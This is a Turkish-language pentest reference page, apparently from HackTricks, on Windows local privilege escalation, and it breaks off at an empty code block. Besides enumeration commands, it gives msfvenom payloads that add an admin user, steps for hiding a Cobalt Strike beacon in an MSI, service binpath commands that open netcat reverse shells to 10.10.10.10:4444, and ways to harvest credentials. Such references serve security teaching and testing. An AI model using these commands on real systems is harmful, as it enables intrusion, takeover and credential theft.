# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation vektörlerini aramak için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Windows Temelleri

### Access Tokens

**Eğer Windows Access Tokens'in ne olduğunu bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okuyun:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs hakkında daha fazla bilgi için aşağıdaki sayfayı kontrol edin:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows'ta integrity levels'in ne olduğunu bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okuyun:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Güvenlik Kontrolleri

Windows'ta sistem keşfini engelleyebilecek, executable çalıştırmanızı önleyebilecek veya hatta aktivitelerinizi tespit edebilecek farklı unsurlar vardır. Privilege escalation enumerasyonuna başlamadan önce aşağıdaki sayfayı okuyup bu savunma mekanizmalarını belirlemelisiniz:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## Sistem Bilgileri

### Version info enumeration

Windows sürümünde bilinen bir zafiyet olup olmadığını kontrol edin (uygulanan yamaları da kontrol edin).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

This [site](https://msrc.microsoft.com/update-guide/vulnerability) Microsoft güvenlik açıkları hakkında ayrıntılı bilgi aramak için kullanışlıdır. Bu veritabanında 4,700'den fazla güvenlik açığı bulunuyor; bu, bir Windows ortamının sunduğu **devasa saldırı yüzeyini** gösteriyor.

**Sistemde**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas watson'ı içerir)_

**Sistem bilgisi ile yerelde**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Ortam

Env değişkenlerinde herhangi bir credential/Juicy bilgi kaydedildi mi?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell Geçmişi
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transkript dosyaları

Bunu nasıl etkinleştireceğinizi şu adreste öğrenebilirsiniz: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell pipeline yürütmelerinin ayrıntıları kaydedilir; yürütülen komutlar, komut çağrıları ve betiklerin parçaları dahil edilir. Ancak tüm yürütme ayrıntıları ve çıktı sonuçları yakalanmayabilir.

Bunu etkinleştirmek için dokümantasyondaki "Transcript files" bölümündeki talimatları izleyin ve **"Module Logging"**'i **"Powershell Transcription"** yerine tercih edin.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell logs'dan son 15 olayı görüntülemek için şunu çalıştırabilirsiniz:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

script'in yürütülmesinin tüm etkinlik ve içerik kaydı elde edilir; böylece her kod bloğu çalıştırılırken belgelendirilir. Bu süreç, her etkinliğin kapsamlı bir denetim izini korur ve adli inceleme ile kötü amaçlı davranışların analizinde değerlidir. Çalıştırma anında tüm etkinlikleri belgeleyerek süreç hakkında ayrıntılı içgörüler sağlar.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block için kayıt olayları Windows Event Viewer'da şu yolda bulunabilir: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Son 20 olayı görüntülemek için şunu kullanabilirsiniz:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### İnternet Ayarları
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Sürücüler
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Güncellemeler http**S** değil http üzerinden isteniyorsa sistemi ele geçirebilirsiniz.

İlk olarak ağın non-SSL WSUS güncellemesi kullanıp kullanmadığını cmd'de aşağıdakini çalıştırarak kontrol edin:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Veya PowerShell'de aşağıdaki:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Eğer aşağıdakilerden birine benzer bir yanıt alırsanız:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Ve eğer `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` veya `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` değeri `1` ise.

O zaman, **sömürülebilir.** Eğer son kayıt değeri `0` ise, WSUS girişi göz ardı edilir.

Bu zafiyetleri sömürmek için şu araçları kullanabilirsiniz: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS](https://github.com/GoSecure/pywsus) — Bunlar, SSL olmayan WSUS trafiğine 'fake' güncellemeler enjekte etmek için kullanılan MiTM amaçlı exploit scriptleridir.

Araştırmayı burada okuyun:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Tam raporu buradan okuyun**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Temelde, bu hatanın sömürdüğü kusur şudur:

> Eğer yerel kullanıcı proxymizi değiştirme yetkimiz varsa ve Windows Updates Internet Explorer ayarlarında yapılandırılmış proxy'i kullanıyorsa, bu durumda [PyWSUS](https://github.com/GoSecure/pywsus)'u yerel olarak çalıştırıp kendi trafiğimizi yakalayabilir ve hedef makinada yükseltilmiş bir kullanıcı olarak kod çalıştırabiliriz.
>
> Ayrıca, WSUS servisi geçerli kullanıcının ayarlarını kullandığı için onun certificate store'unu da kullanır. WSUS hostname'i için self-signed bir sertifika oluşturup bu sertifikayı geçerli kullanıcının sertifika deposuna eklersek, hem HTTP hem de HTTPS WSUS trafiğini yakalayabiliriz. WSUS, sertifikada trust-on-first-use tipi bir doğrulamayı uygulamak için HSTS-benzeri mekanizmalar kullanmaz. Sunulan sertifika kullanıcı tarafından güvenilir ve doğru hostname'e sahipse, servis tarafından kabul edilir.

Bu zafiyeti [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) aracıyla (kullanılabilir olduğunda) sömürebilirsiniz.

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Birçok kurumsal agent localhost üzerinde bir IPC yüzeyi ve ayrıcalıklı bir update kanalı açar. Eğer enrollment saldırgan sunucusuna zorlanabiliyorsa ve updater sahte bir root CA'ya veya zayıf imza kontrollerine güveniyorsa, yerel bir kullanıcı SYSTEM hizmetinin kuracağı kötü amaçlı bir MSI teslim edebilir. Netskope stAgentSvc zincirine dayanan genel bir teknik için buraya bakın:

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## KrbRelayUp

Belirli koşullar altında Windows **domain** ortamlarında bir **local privilege escalation** zafiyeti vardır. Bu koşullar, **LDAP signing'in zorunlu olmadığı**, kullanıcıların **Resource-Based Constrained Delegation (RBCD)** yapılandırmasına izin veren kendi-haklarına sahip olması ve kullanıcıların domain içinde bilgisayar oluşturma yeteneğine sahip olması gibi durumlardır. Bu **gereksinimlerin** varsayılan ayarlarla karşılandığını belirtmek önemlidir.

Exploit'i şu adreste bulabilirsiniz: [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Saldırının akışı hakkında daha fazla bilgi için şuna bakın: [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Eğer** bu 2 kayıt **etkinse** (değer **0x1**), herhangi bir ayrıcalıktaki kullanıcılar `*.msi` dosyalarını NT AUTHORITY\\**SYSTEM** olarak **yükleyebilir** (çalıştırabilir).
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Eğer bir meterpreter oturumunuz varsa bu tekniği **`exploit/windows/local/always_install_elevated`** modülünü kullanarak otomatikleştirebilirsiniz

### PowerUP

Geçerli dizin içinde ayrıcalıkları yükseltmek için bir Windows MSI ikili dosyası oluşturmak üzere power-up'taki `Write-UserAddMSI` komutunu kullanın. Bu script, kullanıcı/grup eklemesi isteyen önceden derlenmiş bir MSI installer yazar (dolayısıyla GIU erişimine ihtiyacınız olacak):
```
Write-UserAddMSI
```
Oluşturulan binary'yi çalıştırarak ayrıcalıkları yükseltin.

### MSI Wrapper

Bu eğitimi okuyarak bu araçları kullanarak bir MSI wrapper nasıl oluşturacağınızı öğrenin. Yalnızca **komut satırlarını çalıştırmak** istiyorsanız bir **.bat** dosyasını sarabilirsiniz.

{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX

{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual Studio ile MSI Oluşturma

- Cobalt Strike veya Metasploit ile `C:\privesc\beacon.exe` yoluna yeni bir **Windows EXE TCP payload** **oluşturun**.
- **Visual Studio**'yu açın, **Create a new project** seçeneğini seçin ve arama kutusuna "installer" yazın. **Setup Wizard** projesini seçin ve **Next**'e tıklayın.
- Projeye bir isim verin, örneğin **AlwaysPrivesc**, konum için **`C:\privesc`** kullanın, **place solution and project in the same directory** seçeneğini işaretleyin ve **Create**'e tıklayın.
- **Next**'e tıklamaya devam edin, 4 adımlı işlemde 3. adıma gelene kadar (choose files to include). **Add**'e tıklayın ve az önce oluşturduğunuz Beacon payload'u seçin. Ardından **Finish**'e tıklayın.
- **Solution Explorer** içinde **AlwaysPrivesc** projesini seçin ve **Properties** içinde **TargetPlatform**'ı **x86**'den **x64**'e değiştirin.
- Değiştirebileceğiniz diğer özellikler arasında **Author** ve **Manufacturer** bulunur; bunlar yüklü uygulamanın daha meşru görünmesine yardımcı olabilir.
- Projeye sağ tıklayın ve **View > Custom Actions**'ı seçin.
- **Install**'e sağ tıklayın ve **Add Custom Action**'ı seçin.
- **Application Folder**'a çift tıklayın, **beacon.exe** dosyanızı seçin ve **OK**'e tıklayın. Bu, installer çalıştırıldığında beacon payload'unun hemen yürütülmesini sağlar.
- **Custom Action Properties** altında **Run64Bit**'i **True** olarak değiştirin.
- Son olarak, **build** edin.
- Eğer `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` uyarısı çıkarsa, platformu x64 olarak ayarladığınızdan emin olun.

### MSI Kurulumu

Kötücül `.msi` dosyasının kurulumunu arka planda yürütmek için:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Bu vulnerability'yi exploit etmek için kullanabileceğiniz: _exploit/windows/local/always_install_elevated_

## Antivirus ve Algılama

### Denetim Ayarları

Bu ayarlar neyin **kaydedildiğini** belirler, bu yüzden dikkat etmelisiniz
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, logların nereye gönderildiğini bilmek ilginçtir
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS**, domain'e katılmış bilgisayarlarda her parolanın **benzersiz, rastgele ve düzenli olarak güncellenmesini** sağlayarak yerel Administrator parolalarının **yönetimi** için tasarlanmıştır. Bu parolalar Active Directory içinde güvenli bir şekilde saklanır ve yalnızca ACL'ler aracılığıyla yeterli izin verilmiş kullanıcılar tarafından erişilebilir; yetkili olduklarında yerel admin parolalarını görüntüleyebilirler.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Eğer etkinse, **düz metin parolalar LSASS** (Local Security Authority Subsystem Service) içinde saklanır.\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1**'den itibaren, Microsoft, Local Security Authority (LSA) için güvenilmeyen süreçlerin belleğini **okuma** veya kod enjekte etme girişimlerini **engelleyen** geliştirilmiş koruma getirdi; bu da sistemi daha güvenli hale getirir.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** Windows 10'da tanıtıldı. Amacı, bir cihazda depolanan kimlik bilgilerini pass-the-hash gibi tehditlere karşı korumaktır.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Önbelleğe Alınmış Kimlik Bilgileri

**Domain kimlik bilgileri**, **Yerel Güvenlik Yetkilisi** (LSA) tarafından doğrulanır ve işletim sistemi bileşenleri tarafından kullanılır. Bir kullanıcının oturum açma verileri kayıtlı bir güvenlik paketi tarafından doğrulandığında, genellikle o kullanıcı için domain kimlik bilgileri oluşturulur.\

[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Kullanıcılar & Gruplar

### Kullanıcıları & Grupları Listeleme

Ait olduğunuz gruplardan herhangi birinin ilginç izinlere sahip olup olmadığını kontrol etmelisiniz.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Ayrıcalıklı gruplar

Eğer **bazı ayrıcalıklı gruplara üyeyseniz yetki yükseltmesi yapabilirsiniz**. Ayrıcalıklı gruplar ve bunları yetki yükseltmek için nasıl kötüye kullanabileceğinizi öğrenmek için buraya bakın:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Daha fazla bilgi** bu sayfada bir **token**'ın ne olduğunu öğrenmek için: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Aşağıdaki sayfayı kontrol edin **ilginç tokens** hakkında bilgi edinmek ve bunları nasıl kötüye kullanacağınızı öğrenmek için:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Giriş yapmış kullanıcılar / Oturumlar
```bash
qwinsta
klist sessions
```
### Ev klasörleri
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Parola Politikası
```bash
net accounts
```
### Panonun içeriğini al
```bash
powershell -command "Get-Clipboard"
```
## Running Processes

### File and Folder Permissions

Her şeyden önce, processes'i listeleyip **process'in command line'inde passwords olup olmadığını kontrol edin**.\
Bazı çalışan binary'leri **overwrite edebilir misiniz** veya binary klasöründe yazma izniniz var mı, olası [**DLL Hijacking attacks**](dll-hijacking/index.html) istismarı için kontrol edin:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Her zaman çalışıyor olabilecek [**electron/cef/chromium debuggers** olup olmadığını kontrol edin; bunu ayrıcalıkları yükseltmek için kötüye kullanabilirsiniz](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Süreçlerin ikili dosyalarının izinlerini kontrol etme**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**İşlem ikili dosyalarının bulunduğu klasörlerin izinlerini kontrol etme (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Çalışan bir sürecin bellek dökümünü sysinternals'tan **procdump** ile oluşturabilirsiniz. FTP gibi servislerde **credentials in clear text in memory** bulunur; belleği döküp credentials bilgilerini okumayı deneyin.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Güvensiz GUI uygulamaları

**SYSTEM olarak çalışan uygulamalar bir kullanıcının CMD başlatmasına veya dizinlerde gezinmesine izin verebilir.**

Örnek: "Windows Help and Support" (Windows + F1), "command prompt" arayın, "Click to open Command Prompt" öğesine tıklayın

## Hizmetler

Service Triggers, Windows'un belirli koşullar gerçekleştiğinde (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.) bir servisi başlatmasını sağlar. SERVICE_START haklarına sahip olmasanız bile, tetikleyicilerini çalıştırarak sıklıkla ayrıcalıklı servisleri başlatabilirsiniz. Sayımlama ve etkinleştirme teknikleri için buraya bakın:

-
{{#ref}}
service-triggers.md
{{#endref}}

Servislerin listesini alın:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### İzinler

Bir servisin bilgilerini almak için **sc** kullanabilirsiniz
```bash
sc qc <service_name>
```
Her servis için gerekli privilege level'ı kontrol etmek üzere _Sysinternals_'ten binary **accesschk** bulundurmanız önerilir.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
"Authenticated Users" grubunun herhangi bir servisi değiştirebilip değiştiremeyeceğini kontrol etmeniz önerilir:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Buradan accesschk.exe (XP için) indirebilirsiniz](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Servisi etkinleştir

Bu hatayı alıyorsanız (örneğin SSDPSRV ile):

_Sistem hatası 1058 oluştu._\
_Hizmet başlatılamıyor; ya devre dışı bırakılmış ya da ilişkilendirilmiş etkin bir aygıtı yok._

Bunu şu komutla etkinleştirebilirsiniz
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**upnphost servisinin çalışması için SSDPSRV'ye bağımlı olduğunu dikkate alın (XP SP1 için)**

**Başka bir çözüm** bu sorunu çözmek için şu komutu çalıştırmaktır:
```
sc.exe config usosvc start= auto
```
### **Servis binary yolunu değiştir**

Bir serviste "Authenticated users" grubunun **SERVICE_ALL_ACCESS** yetkisine sahip olduğu durumda, servisin yürütülebilir binary'si değiştirilebilir. Değiştirmek ve çalıştırmak için **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Hizmeti yeniden başlat
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Ayrıcalıklar çeşitli izinler aracılığıyla yükseltilebilir:

- **SERVICE_CHANGE_CONFIG**: Servis binary'sinin yeniden yapılandırılmasına izin verir.
- **WRITE_DAC**: İzinlerin yeniden yapılandırılmasına imkan tanır; bu da servis yapılandırmalarını değiştirme yeteneğine yol açar.
- **WRITE_OWNER**: Sahipliğin devralınmasına ve izinlerin yeniden yapılandırılmasına izin verir.
- **GENERIC_WRITE**: Servis yapılandırmalarını değiştirme yeteneğini devralır.
- **GENERIC_ALL**: Ayrıca servis yapılandırmalarını değiştirme yeteneğini devralır.

Bu zafiyetin tespiti ve exploitation için _exploit/windows/local/service_permissions_ kullanılabilir.

### Servis binary'lerinin zayıf izinleri

**Bir servis tarafından çalıştırılan binary'i değiştirebilip değiştiremeyeceğinizi kontrol edin** veya binary'nin bulunduğu klasörde **yazma izinleriniz** olup olmadığını kontrol edin ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Bir servis tarafından çalıştırılan her binary'i **wmic** ile (not in system32) alabilir ve izinlerinizi **icacls** ile kontrol edebilirsiniz:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Ayrıca **sc** ve **icacls** kullanabilirsiniz:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Servis kayıt defteri izinlerini değiştirme

Herhangi bir servis kayıt defterini değiştirebilip değiştiremeyeceğinizi kontrol etmelisiniz.\

Bir servis **kayıt defteri** üzerindeki **izinlerinizi** şu şekilde **kontrol edebilirsiniz**:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
**Authenticated Users** veya **NT AUTHORITY\INTERACTIVE**'in `FullControl` izinlerine sahip olup olmadığı kontrol edilmelidir. Eğer öyleyse, servis tarafından çalıştırılan binary değiştirilebilir.

Çalıştırılan binary'nin Path'ini değiştirmek için:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Servisler kayıt defteri AppendData/AddSubdirectory izinleri

Eğer bir kayıt defteri üzerinde bu izne sahipseniz, bu o kayıt defterinden alt kayıt defterleri oluşturabileceğiniz anlamına gelir. Windows servisleri durumunda bu, **istediğiniz kodu çalıştırmak için yeterlidir:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Tırnak içermeyen servis yolları

Bir yürütülebilir dosyaya giden yol tırnak içinde değilse, Windows boşluktan önceki her yol parçasını çalıştırmayı dener.

Örneğin, _C:\Program Files\Some Folder\Service.exe_ yolu için Windows şunları çalıştırmayı dener:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Tırnaklanmamış tüm servis yollarını listeleyin, yerleşik Windows servislerine ait olanlar hariç:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Bu zafiyeti metasploit ile tespit edebilir ve exploit edebilirsiniz:** `exploit/windows/local/trusted\_service\_path` metasploit ile manuel olarak bir service binary oluşturabilirsiniz:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Kurtarma Eylemleri

Windows, bir hizmet başarısız olduğunda uygulanacak eylemleri kullanıcıların belirtmesine izin verir. Bu özellik bir binary'ye işaret edecek şekilde yapılandırılabilir. Eğer bu binary değiştirilebilirse, privilege escalation mümkün olabilir. Daha fazla ayrıntı için [resmi dokümantasyona](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) bakın.

## Uygulamalar

### Yüklü Uygulamalar

**binaries**'in izinlerini kontrol edin (belki birini overwrite ederek privilege escalation elde edebilirsiniz) ve **folders**'ın izinlerini de kontrol edin ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Yazma İzinleri

Bazı özel dosyaları okumak için bazı config dosyalarını değiştirebilip değiştiremeyeceğinizi veya Administrator hesabı tarafından çalıştırılacak bir binary'i değiştirebilme imkanınızın olup olmadığını kontrol edin (schedtasks).

Sistemde zayıf klasör/dosya izinlerini bulmanın bir yolu şudur:
```bash
